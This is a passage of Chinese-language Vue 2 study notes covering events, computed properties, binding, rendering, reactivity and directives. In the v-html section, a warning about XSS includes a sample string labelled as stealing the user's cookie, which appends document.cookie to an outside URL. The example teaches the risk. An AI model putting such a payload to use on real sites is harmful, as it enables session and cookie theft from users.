
</li>
<li><p>事件的回調需要配置在<code>methods</code>對象中，最終會在<code>vm</code>上</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">funct</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
<li><p><code>methods</code>中配置的函數，<font color="#f54747">不要用箭頭函數</font>，否則this就不是vm了</p>
</li>
<li><p><code>methods</code>中配置的函數，都是被Vue所管理的函數，<code>this</code>的指向是<code>vm</code>或組件實例對象</p>
</li>
<li><p><code>@click=&quot;demo&quot;</code>和<code>@click=&quot;demo($event)&quot;</code>效果一致，但後者可以傳参</p>
</li>
</ol>
<h3 id="事件修飾符"><a href="#事件修飾符" class="headerlink" title="事件修飾符"></a>事件修飾符</h3><ol>
<li><code>prevent</code>：阻止默認事件</li>
<li><code>stop</code>：阻止事件冒泡</li>
<li><code>once</code>：事件只出發一次</li>
<li><code>capture</code>：使用事件的捕獲模式</li>
<li><code>self</code>：只有<code>event.target</code>是當前操作的元素時才觸法事件</li>
<li><code>passive</code>：事件的默認行為立即執行，無需等到事件回調執行完畢 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;button @click.xxx=&quot;funct(parameters)&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
 備註：修飾符可以連續寫，例如<code>@click.prevent.stop</code>先阻止默認事件，再阻止冒泡</li>
</ol>
<h3 id="鍵盤事件"><a href="#鍵盤事件" class="headerlink" title="鍵盤事件"></a>鍵盤事件</h3><ol>
<li><p>Vue中常用的按鍵別名：<br> <code>enter</code>、<code>delete</code>、<code>esc</code>、<code>space</code>、<code>tab</code> (特殊，必須配合keydown去使用)、<code>up</code>、<code>down</code>、<code>left</code>、<code>right</code></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.enter=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure>

</li>
<li><p>Vue未提供別名的按鍵，可以使用按鍵原始的key值去綁定，但注意要轉為<code>kebab-case</code>(短橫線命名)</p>
</li>
<li><p>系統修飾鍵（用法特殊）：<code>ctrl</code>、<code>alt</code>、<code>shift</code>、<code>meta</code></p>
<ul>
<li>配合<code>keyup</code>使用：按下修飾鍵的同時，再按下其他鍵，隨後釋放其他鍵，事件才會觸發</li>
<li>配合<code>keydown</code>使用：正常觸發事件  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; @keyup.ctrl.y=&quot;funct&quot;&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>也可以使用<code>keyCode</code>去指定具體的按鍵（不推薦）</p>
</li>
<li><p><code>Vue.config.keyCodes.自定義鍵名 = 鍵碼</code>，可以去定製按鍵別名</p>
</li>
</ol>
<h2 id="計算屬性"><a href="#計算屬性" class="headerlink" title="計算屬性"></a>計算屬性</h2><ol>
<li><p>定義：要用的屬性不存在，要通過「已有的屬性 (並非已有的隨便一個變量)」計算得來</p>
</li>
<li><p>原理：底層借助了<code>Object.defineProperty</code>方法提供的<code>getter</code>和<code>setter</code></p>
</li>
<li><p><code>get</code>函數的執行時間：</p>
<ul>
<li>初次讀取時會執行一次</li>
<li>當依賴的數據發生改變時會被再次調用</li>
</ul>
</li>
<li><p>優勢：與<code>methods</code>實現相比，內部有緩存機制(複用)，效率更高，調試方便</p>
</li>
<li><p>備註：</p>
<ol>
<li>計算屬性最終會出現在<code>vm</code>上，可直接讀取使用</li>
<li>如果計算屬性要被修改，那必須寫<code>set</code>函數去響應修改，且<code>set</code>中要引起計算時依賴的數據發生</li>
<li>如果只考慮讀取、不考慮改寫，可以使用簡寫方法，但因為是計算屬性不是<code>method</code>，因此不要加()</li>
</ol>
</li>
<li><p>具體代碼：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">    <span class="comment">// 完整寫法：</span></span><br><span class="line">    <span class="attr">fullName</span>:&#123;</span><br><span class="line">        <span class="title function_">get</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>     <span class="comment">// 被調用的屬性即是依賴的屬性</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">set</span>(<span class="params">value</span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> arr = value.<span class="title function_">split</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">firstName</span> = arr[<span class="number">0</span>];</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">lastName</span> = arr[<span class="number">1</span>];</span><br><span class="line">        &#125;                    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 簡寫</span></span><br><span class="line">    <span class="title function_">fullName</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&#x27;-&#x27;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="綁定樣式"><a href="#綁定樣式" class="headerlink" title="綁定樣式"></a>綁定樣式</h2><h3 id="class樣式"><a href="#class樣式" class="headerlink" title="class樣式"></a>class樣式</h3><ul>
<li>語法：<code>:class=&quot;xxx&quot;</code>，<code>xxx</code>可以是字符串、數組和對象</li>
</ul>
<ol>
<li><p>字符串寫法</p>
<ul>
<li>適用於：類名不確定，要動態獲取  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 字符串寫法，適用於：樣式的類名不確定，需要動態決定 --&gt;</span><br><span class="line">&lt;div :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">mood</span>: <span class="string">&#x27;normal&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組寫法</p>
<ul>
<li>適用於：要綁定多個樣式，個數確定，名字也確定  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 數組寫法，適用於：要綁定的樣式個數不確定、名字也不確定 --&gt;</span><br><span class="line">&lt;div :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">classArr</span>:[<span class="string">&#x27;a1&#x27;</span>, <span class="string">&#x27;a2&#x27;</span>, <span class="string">&#x27;a3&#x27;</span>],</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>對象寫法</p>
<ul>
<li>適用於：要綁定多個樣式，個數不確定、名字也不確定  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定class樣式 -- 對象寫法，適用於：要昂丁的樣式個數確定、名字也確定，但要動態決定用不用 --&gt;</span><br><span class="line">&lt;div :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">classObj</span>:&#123; <span class="attr">a1</span>:<span class="literal">false</span>, <span class="attr">a2</span>:<span class="literal">false</span>, <span class="attr">a3</span>:<span class="literal">true</span> &#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="style樣式"><a href="#style樣式" class="headerlink" title="style樣式"></a>style樣式</h3><ol>
<li><p>對象寫法</p>
<ul>
<li>語法：<code>:style=&quot;&#123;fontSize: xxx&#125;&quot;</code> 其中<code>xxx</code>是動態值  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 對象寫法 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">styleObj</span>:&#123;</span><br><span class="line">    <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">    <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>數組寫法</p>
<ul>
<li>語法：<code>:style=&quot;[a,b]&quot;</code> 其中a,b是樣式對象  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 綁定style樣式 -- 數組寫法，不常用 --&gt;</span><br><span class="line">&lt;div :style=&quot;styleArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt;&lt;br&gt;</span><br></pre></td></tr></table></figure>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">styleArr</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">fontSize</span>: <span class="string">&#x27;40px&#x27;</span>,</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">backgroundColor</span>: <span class="string">&#x27;orange&#x27;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="條件渲染"><a href="#條件渲染" class="headerlink" title="條件渲染"></a>條件渲染</h2><ol>
<li><p><code>v-if</code></p>
<ul>
<li>適用於：切換頻率比較低的場景</li>
<li>特點：<font color="#f54747">不展示的DOM元素會被直接移除</font></li>
<li>注意：<code>v-if</code>可以和<code>v-else-if</code>, <code>v-else</code>一起使用，但要求結構不能被「打斷」</li>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-if=&quot;n === 1&quot;&gt;Angular&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 2&quot;&gt;React&lt;/div&gt;</span><br><span class="line">&lt;div v-else-if=&quot;n === 3&quot;&gt;Vue&lt;/div&gt;</span><br><span class="line">&lt;div v-else&gt;haha&lt;/div&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-show</code></p>
<ul>
<li>適用於：切換頻率較高的場景</li>
<li>特點：不展示的DOM元素不會被移除，僅僅是使用樣式隱藏</li>
<li>具體代碼：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h2 v-show=&quot;false&quot;&gt;Hello&lt;/h2&gt;</span><br><span class="line">&lt;h2 v-show=&quot;1 === 1&quot;&gt;Hello&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>備註：使用<code>v-if</code>時，元素可能無法獲取到，而使用<code>v-show</code>一定可以獲取到</p>
</li>
</ol>
<h2 id="列表渲染-v-for"><a href="#列表渲染-v-for" class="headerlink" title="列表渲染 v-for"></a>列表渲染 <code>v-for</code></h2><ol>
<li><p>簡介：</p>
<ul>
<li>用於展示列表數據</li>
<li>可遍歷：數組、對象、字符串、指定次數</li>
<li>語法：<code>v-for=&quot;(item, index) in obj&quot; :key=&quot;index&quot;</code></li>
</ul>
</li>
<li><p>遍歷數組</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125; -- &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="attr">persons</span>:[</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">19</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;John&#x27;</span>, <span class="attr">age</span>:<span class="number">20</span>&#125;,</span><br><span class="line">            &#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Jack&#x27;</span>, <span class="attr">age</span>:<span class="number">21</span>&#125;,</span><br><span class="line">        ],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷對象</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(value,k) in car&quot; :key=&quot;k&quot;&gt;</span><br><span class="line">    &#123;&#123;k&#125;&#125; -- &#123;&#123;value&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>:&#123;     </span><br><span class="line">        <span class="attr">car</span>:&#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&#x27;Porsche&#x27;</span>,</span><br><span class="line">            <span class="attr">price</span>:<span class="string">&#x27;10M&#x27;</span>,</span><br><span class="line">            <span class="attr">color</span>:<span class="string">&#x27;Black&#x27;</span></span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷字符串（少用）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(char,index) in str&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;char&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">str</span>:<span class="string">&#x27;Hello&#x27;</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>遍歷指定次數（少用）</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(number,index) in 10&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">    &#123;&#123;number&#125;&#125; - &#123;&#123;index&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="key的內部原理"><a href="#key的內部原理" class="headerlink" title="key的內部原理"></a>key的內部原理</h2><ol>
<li><p>虛擬DOM中<code>key</code>的作用：</p>
<ul>
<li>key是虛擬DOM對象的標識，當狀態中的數據發生變化時，Vue會根據「新數據」生成「新的虛擬DOM」</li>
<li>隨後Vue進行「新虛擬DOM」與「舊虛擬DOM」的差異比較(diff Algorithm)</li>
</ul>
</li>
<li><p>Diff Algorithm 對比規則：</p>
<ul>
<li><p>舊虛擬DOM中<font color="#f54747">找到</font>與新虛擬DOM相同的<code>key</code></p>
<ol>
<li>若虛擬DOM中內容<font color="#f54747">沒變</font>，直接使用之前的真實DOM</li>
<li>若虛擬DOM中內容<font color="#f54747">有變</font>，則聲稱新的真實DOM，隨後替換掉頁面中之前的真實DOM</li>
</ol>
</li>
<li><p>舊虛擬DOM中<font color="#f54747">找不到</font>與新虛擬DOM相同的<code>key</code></p>
<ul>
<li>創建新的真實DOM，隨後渲染到頁面</li>
</ul>
</li>
</ul>
</li>
<li><p>用<code>index</code>作為<code>key</code>可能引發的問題：</p>
<ol>
<li><p>若對數據進行：逆序添加、逆序刪除等破壞順序的操作：</p>
<ul>
<li>會產生沒有必要的真實DOM更新 &#x3D;&gt; 界面效果沒問題，但效率低</li>
</ul>
</li>
<li><p>如果結構中還包括輸入類的DOM：</p>
<ul>
<li>會產生錯誤DOM更新 &#x3D;&gt; 介面有問題</li>
</ul>
</li>
</ol>
</li>
<li><p>開發中如何選擇<code>key</code>：</p>
<ol>
<li>最好使用每條數據的唯一標識作為<code>key</code>，比如<code>id</code>、手機號碼、身分證號碼、學生證號碼等唯一值</li>
<li>如果<font color="#f54747">不存在對數據的逆序添加、逆序刪除等破壞順序的操作，僅用於渲染列表用於展示</font><ul>
<li>使用<code>index</code>作為<code>key</code>是沒有問題的</li>
</ul>
</li>
</ol>
</li>
</ol>
<h2 id="Vue監測原理"><a href="#Vue監測原理" class="headerlink" title="Vue監測原理"></a>Vue監測原理</h2><ol>
<li><p>更新時的問題：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;li v-for=&quot;(p,index) in persons&quot; :key=&quot;p.id&quot;&gt;</span><br><span class="line">    &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>當數據是保存在一個對象裡，如果直接修改對象數據，則頁面也會更新數據</p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>].<span class="property">name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然而，如果修改整個對象，則頁面<font color="#f54747">不會更新數據</font></p>
  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">persons</span>[<span class="number">0</span>] = &#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>, <span class="attr">name</span>:<span class="string">&#x27;Donald&#x27;</span>, <span class="attr">age</span>:<span class="number">50</span>&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Vue監測對象中的數據：</p>
<ul>
<li>通過<code>setter</code>實現監視，且要再<code>new Vue</code>時就傳入要監測的數據</li>
<li>對象中後追加的屬性，Vue默認不做響應式處理<font color="#f54747">（後追加的屬性並沒有添加<code>setter</code>）</font></li>
<li>如需要給後添加的屬性做響應式，則需要使用一下API：<ol>
<li><code>Vue.set(target, key, value)</code></li>
<li><code>vm.$set(target, key, value)</code></li>
</ol>
</li>
<li>具體代碼：  <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">methods</span>:&#123;</span><br><span class="line">    <span class="title function_">addGender</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Vue</span>.<span class="title function_">set</span>(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">        <span class="variable language_">this</span>.$set(<span class="variable language_">this</span>.<span class="property">students</span>, <span class="string">&#x27;gender&#x27;</span>, <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Vue監測數組中的數據：</p>
<ul>
<li>通過包裹數組更新元素的方法實現，本質包裹裡就做了兩件事：<ol>
<li>調用原生對應的方法對數組進行更新</li>
<li>重新解析模板，進而更新頁面</li>
</ol>
</li>
</ul>
</li>
<li><p>在Vue修改數組中的某個元素一定要用如下方法：</p>
<ul>
<li>使用以下API：<code>push()</code>, <code>pop()</code>, <code>shift()</code>, <code>unshift()</code>, <code>splice()</code>, <code>sort()</code>, <code>reverse()</code></li>
<li><code>Vue.set()</code> 或 <code>vm.$set</code></li>
</ul>
</li>
<li><p>備註：<font color="#f54747"><code>Vue.set()</code>和<code>vm.$set</code>不可以給<code>vm</code>或<code>vm</code>的跟數據對象 添加屬性！！！</font></p>
</li>
</ol>
<h2 id="收集表單數據"><a href="#收集表單數據" class="headerlink" title="收集表單數據"></a>收集表單數據</h2><ol>
<li><p>Vue對輸入框數據的收集：</p>
<ol>
<li><p><code>&lt;input type=&quot;text&quot;/&gt;</code></p>
<ul>
<li><code>v-model</code>收集的是<code>value</code>值，而用戶輸入的就是<code>value</code>值</li>
</ul>
</li>
<li><p><code>&lt;input type=&quot;radio&quot;/&gt;</code></p>
<ul>
<li><code>v-model</code>收集的是<code>value</code>值，而要給標籤配置<code>value</code>值</li>
</ul>
</li>
<li><p><code>&lt;input type=&quot;checkbox&quot;/&gt;</code></p>
<ul>
<li><p>如果沒有配置<code>input</code>的<code>value</code>屬性</p>
<ul>
<li>則<code>v-model</code>收集的是<code>checked</code>的布爾值</li>
</ul>
</li>
<li><p>如果有配置<code>input</code>的<code>value</code>屬性</p>
<ol>
<li><code>v-model</code>的初始值是非數組，那麼收集的就是<code>checked</code>的布爾值</li>
<li><code>v-model</code>的初始值是數組，那麼收集的就是<code>value</code>組成的數組</li>
</ol>
</li>
</ul>
</li>
</ol>
</li>
<li><p><code>v-model</code>的三個修飾符：</p>
<ol>
<li><code>lazy</code>：失去焦點再收集數據</li>
<li><code>number</code>：輸入字符串轉為有效數字</li>
<li><code>trim</code>：輸入收尾空格過濾</li>
</ol>
<ul>
<li>語法：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 失去焦點時，userInfo.other收集輸入框數據 --&gt;</span><br><span class="line">&lt;textarea v-model.lazy=&quot;userInfo.other&quot;&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="過濾器（已刪除）"><a href="#過濾器（已刪除）" class="headerlink" title="過濾器（已刪除）"></a>過濾器（已刪除）</h2><ol>
<li><p>定義：對要顯示的數據進行特定的格式化後再顯示</p>
</li>
<li><p>語法：</p>
<ol>
<li>註冊過濾器：<code>Vue.filter(name, callback)</code> 或 <code>new Vue(filters:&#123;&#125;)</code></li>
<li>使用過濾器：<code>&#123;&#123;xxx | filterName&#125;&#125;</code> 或 <code>v-bind:屬性=&quot;xxx | filterName&quot;</code></li>
</ol>
</li>
<li><p>備註：</p>
<ol>
<li>過濾器可以接受額外參數，多個過濾器也可以串連</li>
<li>並沒有改變原本的數據，會產生新的對應數據</li>
</ol>
</li>
</ol>
<h2 id="Vue內置指令"><a href="#Vue內置指令" class="headerlink" title="Vue內置指令"></a>Vue內置指令</h2><ol>
<li><p><code>v-text</code></p>
<ul>
<li><p>作用：向其所在的節點中渲染文本內容</p>
</li>
<li><p>與插值語法的區別：<font color="#f54747"><code>v-text</code>會替換掉節點中的內容，插值語法則不會</font></p>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-text=&quot;&#x27;Hello, &#x27; + name&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        name:&#x27;Donald&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-html</code></p>
<ul>
<li><p>作用：向指定節點中渲染包含html結構的內容</p>
</li>
<li><p>與插值語法的區別：</p>
<ol>
<li><code>v-html</code>會替換掉節點中的所有內容</li>
<li><code>v-html</code>可以識別<code>html</code>結構</li>
</ol>
</li>
<li><p><font color="#f54747">嚴重注意：v-html有安全性問題：</font></p>
<ol>
<li>在網站上動態渲任意HTML是非常危險的，容易導致XSS攻擊</li>
<li>一定要在可信的內容上使用v-html，永遠不要再用戶提交的內容上使用</li>
</ol>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div v-html=&quot;str&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div v-html=&quot;str2&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    data:&#123;</span><br><span class="line">        str: &#x27;&lt;h3&gt;Hello World&lt;/h3&gt;&#x27;,</span><br><span class="line">        // 竊取用戶cookie</span><br><span class="line">        str2: &#x27;&lt;a href=javascript:location.href=&quot;http://www.google.com?&quot; + document.cookie&gt;Click Me&lt;/a&gt;&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-cloak</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li>本質是一個特殊屬性，Vue實例創建完畢並接管容器後，會刪除<code>v-cloak</code>屬性</li>
<li>使用css配合<code>v-cloak</code>可以解決網速慢時頁面展示出的<code>&#123;&#123;xxx&#125;&#125;</code>問題</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    [v-cloak]&#123;</span><br><span class="line">        /* 避免出現的樣式丟失問題 */</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-once</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li><code>v-once</code>所在節點在初次動態渲染後，就視為靜態內容了</li>
<li>以後數據的改變不會引起<code>v-once</code>所在結構的更新，可以用於優化性能</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;變成靜態內容 --&gt;</span><br><span class="line">&lt;h2 v-once&gt;initialized value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>v-pre</code></p>
<ul>
<li><p>作用：</p>
<ul>
<li>跳過其所在節點的編譯過程</li>
<li>可以利用它跳過：沒有使用指令語法、沒有使用插值語法的節點，會加快編譯</li>
</ul>
</li>
<li><p>具體代碼：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &#123;&#123;n&#125;&#125;被跳過，不會動態渲染 --&gt;</span><br><span class="line">&lt;h2 v-pre&gt;current value of n = &#123;&#123;n&#125;&#125;&lt;/h2&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h3 id="自定義指令"><a href="#自定義指令" class="headerlink" title="自定義指令"></a>自定義指令</h3><ol>
<li><p>定義語法：</p>
<ol>
<li><p>局部指令：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">directives</span>:&#123;指令名:配置對象&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="title function_">directives</span>(<span class="params"></span>)&#123;指令名:回調函數&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 案例: 定義一個v-enlarge指令，和v-text功能類似，會把綁定的數值放大10倍 --&gt;</span><br><span class="line">&lt;h2&gt;10n = &lt;span v-enlarge=&quot;n&quot;&gt;&lt;/span&gt;&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        enlarge(element,binding)&#123;</span><br><span class="line">            element.innerText = binding.value * 10</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>全局指令：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 配置對象)</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, 回調函數)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>配置對象中常用的3個回調：</p>
<ol>
<li><code>bind</code>：指令與元素成功綁定時</li>
<li><code>inserted</code>：指令所在元素被插入頁面時</li>
<li><code>update</code>：指令所在模板結構被重新解析時</li>
</ol>
<ul>
<li>案例：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- 需求2: 定義一個v-fbind指令，和v-bind功能類似，但可以讓所綁定的input元素默認獲取焦點 --&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">new Vue(&#123;</span><br><span class="line">    directives:&#123;</span><br><span class="line">        fbind:&#123;</span><br><span class="line">            // 指令與元素成功綁定時（初次）</span><br><span class="line">            bind(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在元素在插入頁面時</span><br><span class="line">            inserted(element, binding)&#123;</span><br><span class="line">                element.focus()</span><br><span class="line">            &#125;,</span><br><span class="line">            // 指令所在的模板被重新解析時</span><br><span class="line">            update(element, binding)&#123;</span><br><span class="line">                element.value = binding.value</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span 